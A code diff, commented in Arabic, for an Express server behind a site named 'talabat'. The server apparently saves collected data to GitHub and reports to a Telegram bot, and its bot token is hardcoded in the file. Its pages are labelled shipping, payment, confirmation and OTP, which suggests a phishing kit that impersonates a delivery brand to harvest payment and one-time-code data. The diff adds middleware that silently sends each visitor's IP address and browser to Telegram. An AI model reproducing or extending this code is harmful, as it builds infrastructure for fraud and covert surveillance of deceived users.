@@ -5,8 +5,8 @@ const PORT = process.env.PORT || 3000;
 
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
 const REPO_OWNER = 'afffaaaa28-glitch';
-const REPO_NAME = 'talabat'; // ← غيرنا اسم المستودع
-const FILE_PATH = 'talabat-data.txt'; // ← غيرنا اسم الملف
+const REPO_NAME = 'talabat';
+const FILE_PATH = 'talabat-data.txt';
 
 // ========== إعدادات تيلجرام ==========
 const TELEGRAM_TOKEN = '8810906768:AAEPvCGIGJI8cJtzloiRQYd0GV_W6aHLdO4';
@@ -40,6 +40,67 @@ async function sendTelegramMessage(message) {
         console.error('❌ خطأ في إرسال الإشعار:', e.message);
     }
 }
+
+// ========== دالة إرسال إشعار الزيارة ==========
+async function sendVisitNotification(page, ip, userAgent) {
+    try {
+        let msg = `👁️ <b>زيارة جديدة للموقع</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        msg += `📄 الصفحة: ${page}\n`;
+        msg += `🌐 IP: ${ip || 'غير معروف'}\n`;
+        msg += `💻 المتصفح: ${userAgent || 'غير معروف'}\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://talabat.vercel.app/data-viewer">📊 عرض البيانات</a>`;
+        
+        await sendTelegramMessage(msg);
+    } catch (e) {
+        console.error('❌ خطأ في إرسال إشعار الزيارة:', e.message);
+    }
+}
+
+// ========== Middleware لتتبع الزيارات ==========
+app.use((req, res, next) => {
+    // تجاهل طلبات API والملفات الثابتة
+    if (req.path.startsWith('/api/') || 
+        req.path.startsWith('/submit-') || 
+        req.path === '/favicon.ico' ||
+        req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|webp|woff|woff2|ttf|eot)$/)) {
+        return next();
+    }
+    
+    // منع التكرار: استخدم Session أو Cookie بسيط
+    // نستخدم متغير عشان نتأكد إن الإشعار اتسبت قبل كده
+    if (req._visitNotified) {
+        return next();
+    }
+    req._visitNotified = true;
+    
+    // الحصول على IP العميل
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
+               req.headers['x-real-ip'] || 
+               req.socket.remoteAddress || 
+               'غير معروف';
+    
+    // الحصول على نوع المتصفح
+    const userAgent = req.headers['user-agent'] || 'غير معروف';
+    
+    // اسم الصفحة
+    let pageName = req.path || '/';
+    if (pageName === '/') pageName = 'الصفحة الرئيسية 🏠';
+    else if (pageName === '/page2') pageName = 'صفحة الشحن 📦';
+    else if (pageName === '/page3') pageName = 'صفحة الدفع 💳';
+    else if (pageName === '/page4') pageName = 'صفحة التأكيد 🔐';
+    else if (pageName === '/page5') pageName = 'صفحة OTP 📱';
+    else if (pageName === '/data-viewer') pageName = 'عرض البيانات 📊';
+    
+    // إرسال إشعار (مع تأخير صغير)
+    setTimeout(() => {
+        sendVisitNotification(pageName, ip, userAgent);
+    }, 200);
+    
+    next();
+});
 
 // ========== دالة حفظ على GitHub ==========
 async function saveToGitHub(newData) {
